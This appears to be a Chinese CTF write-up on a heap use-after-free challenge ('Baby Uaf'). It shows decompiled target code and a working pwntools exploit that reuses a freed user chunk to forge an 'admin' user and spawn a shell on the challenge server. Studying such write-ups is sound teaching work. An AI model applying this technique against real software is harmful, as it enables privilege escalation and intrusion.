---
title: uaf
published: 2025-12-24
description: "Uaf"
tags: ["ctfwp", "heap", "srop"]
category: ctf
draft: false
---

## heap uaf
UAF 是 堆利用的一种常见的利用方式。

### 例题 pwny-ctf Baby Uaf
将题目拖入ida, 发现如下关键代码
```c
void __cdecl handle_choice(choice_t choice, char *arg1_string, size_t arg1_len)
{
  user_t *new_user; // [rsp+28h] [rbp-38h]
  document_t *new_document; // [rsp+30h] [rbp-30h]
  int arg1; // [rsp+38h] [rbp-28h]
  int arg1a; // [rsp+38h] [rbp-28h]
  int arg1b; // [rsp+38h] [rbp-28h]
  int k; // [rsp+3Ch] [rbp-24h]
  int j; // [rsp+40h] [rbp-20h]
  int i_1; // [rsp+44h] [rbp-1Ch]
  int i_0; // [rsp+48h] [rbp-18h]
  int i; // [rsp+4Ch] [rbp-14h]
  char *doc_contents; // [rsp+50h] [rbp-10h]
  char *cursor; // [rsp+58h] [rbp-8h]
  document_t *cursora; // [rsp+58h] [rbp-8h]

  if ( (unsigned int)choice > input_choice_enum_t::EXIT )
  {
    if ( choice == input_choice_enum_t::INVALID )
      puts("Invalid command!");
  }
  else
  {
    switch ( choice )
    {
      case input_choice_enum_t::CREATE_USER:    // 创建新的用户 #  E
        if ( !arg1_string )
        {
          puts("Need to give a name!");
          return;
        }
        i = 0;
        while ( 2 )
        {
          if ( i <= 31 )
          {
            if ( !users[i] || strncmp(arg1_string, users[i]->name, 0x3Cu) )
            {
              ++i;
              continue;
            }
            puts("User exists already!");
          }
          else
          {
            new_user = create_user(arg1_string);
            if ( new_user )
            {
              new_user->logged_in = 1;
              printf("Created user %d\n", num_users - 1);
            }
          }
          break;
        }
        return;
      case input_choice_enum_t::SWITCH_USER:    // 登录当前选定的用户 # D
        arg1 = get_arg(arg1_string);
        if ( arg1 >= 0 )
        {
          switch_user(arg1);
          putchar(10);
        }
        else
        {
          puts("Invalid argument! (Need to use index, not name)\n");
        }
        return;
      case input_choice_enum_t::SHOW_USERS:     // 列出当前用户列表
        puts("+--------------------------------+");
        puts("| id: (name, logged_in, address) |");
        puts("+--------------------------------+");
        for ( i_0 = 0; i_0 <= 31; ++i_0 )
        {
          if ( users[i_0] )
          {
            printf("%d: ('%s', %d, %p)", i_0, users[i_0]->name, users[i_0]->logged_in, users[i_0]);
            if ( i_0 == current_user )
              printf(" <-- selected user");
            putchar(10);
          }
        }
        putchar(10);
        return;
      case input_choice_enum_t::DEL_USER:       // 删除用户 # C
        arg1a = get_arg(arg1_string);
        if ( arg1a >= 0 )
        {
          if ( (unsigned int)arg1a < 0x20 )
          {
            if ( users[arg1a] )
            {
              if ( users[arg1a]->logged_in )
              {
                if ( arg1a == current_user )
                {
                  puts("Can't delete the currently selected user!\n");
                }
                else
                {
                  printf("Deleted user %d (named %s)\n\n", arg1a, users[arg1a]->name);
                  free(users[arg1a]);
                }
              }
              else
              {
                puts("Can't delete this user as they aren't logged in!\n");
              }
            }
            else
            {
              puts("No such user\n");
            }
          }
        }
        else
        {
          puts("Invalid argument!\n");
        }
        return;
      case input_choice_enum_t::CREATE_DOC:
        if ( num_documents <= 0x1F && (new_document = (document_t *)calloc(1u, 0x40u)) != 0 )
        {
          documents[num_documents++] = new_document;
          printf("Created document %d\n", num_documents - 1);
        }
        else
        {
          puts("Couldn't create a document\n");
        }
        return;
      case input_choice_enum_t::WRITE_DOC:                   // # B
        cursor = arg1_string;
        doc_contents = 0;
        break;
      case input_choice_enum_t::SHOW_DOCS:
        if ( !num_documents )
          puts("No documents yet. Create one with 'create_doc'!\n");
        for ( i_1 = 0; i_1 <= 31; ++i_1 )
        {
          if ( documents[i_1] )
          {
            cursora = documents[i_1];
            printf("+------ %02d ------+\n", i_1);
            printf("| %p |\n", documents[i_1]);
            for ( j = 0; j <= 3; ++j )
            {
              putchar(124);
              for ( k = 0; k <= 15; ++k )
              {
                if ( cursora->text[0] )
                  putchar(cursora->text[0]);
                else
                  putchar(32);
                cursora = (document_t *)((char *)cursora + 1);
              }
              puts("|");
            }
            puts("+----------------+");
          }
        }
        return;
      case input_choice_enum_t::SHELL:
        if ( !strcmp(users[current_user]->name, "admin") )// 获取shell # A
        {
          puts("Ok here's a shell:");
          system("/bin/sh");
        }
        else
        {
          puts("Need to be logged in as 'admin' to do that!\n");
        }
        return;
      case input_choice_enum_t::HELP:
        show_help();
        return;
      case input_choice_enum_t::INFO:
        show_info();
        return;
      case input_choice_enum_t::EXIT:
        exit(0);
      default:
        return;
    }
    while ( *cursor )
    {
      if ( *cursor == 32 && cursor[1] )
      {
        doc_contents = cursor + 1;
        --arg1_len;
        break;
      }
      ++cursor;
      --arg1_len;
    }
    arg1b = get_arg(arg1_string);
    if ( arg1b >= 0 )
    {
      if ( doc_contents )
      {
        if ( arg1_len > 0x40 )
        {
          arg1_len = 64;
          doc_contents[63] = 0;
        }
        if ( arg1b >= num_documents )
        {
          puts("No such document\n");
        }
        else if ( documents[arg1b] )
        {
          printf("[document %d] writing %s\n", arg1b, doc_contents);
          memcpy(documents[arg1b], doc_contents, arg1_len);
        }
      }
      else
      {
        puts("Need something to write!");
      }
    }
    else
    {
      puts("Invalid document!");
    }
  }
}

struct user_t
{
  username[60];
  dword login
}

struct doc_t
{
  text[64];
}
```

可以发现如果当前用户是`admin`的话，那么可以直接获取shell，同时分析`A, C, D` 发现，删除用户没有将指向user的指针设置为NULL以及，同时`user_t` 和`doc_t` 的存储大小相同同时malloc 使用的分配器是按照`first-fit`策略即(从头找，找到适合的，如果过大则分割),所以如果在再次利用很有可能获得上次释放的堆块

所以：
创建一个账号->删除这个账号->创建一个新的文档并且注入payload将地址用户名设置为`admin`-> 登录先前被删除的账号->获取shell

于是得到如下解题脚本
```python
from pwn import *

context.log_level = "debug"

def cmd(p: process, code: str) -> process:
  p.sendafter(b"> ", code.encode())
  return p

# p = process("./heap0_patched")
p = remote("chal.sigpwny.com", 1359)

p = cmd(p, "create_user aUser")
p = cmd(p, "del_user 2")
p = cmd(p, "create_doc")

payload = flat([
  b"admin\x00",   # 6
  b"a" * 54,
  p32(1)
])

# to write
toWrite = b"write_doc 0 " + payload

p.sendafter(b"> ", toWrite)

p = cmd(p, "switch_user 2")
p = cmd(p, "shell")
p.interactive()
```
### 总结:
如何判断是否为first-fit分配方式

1. 方法一：看分配地址
先释放A块，再分配稍大请求
如果得到A块，是First-Fit

2. 方法二：看碎片模式
低地址区小碎片多，高地址区大块多
典型First-Fit特征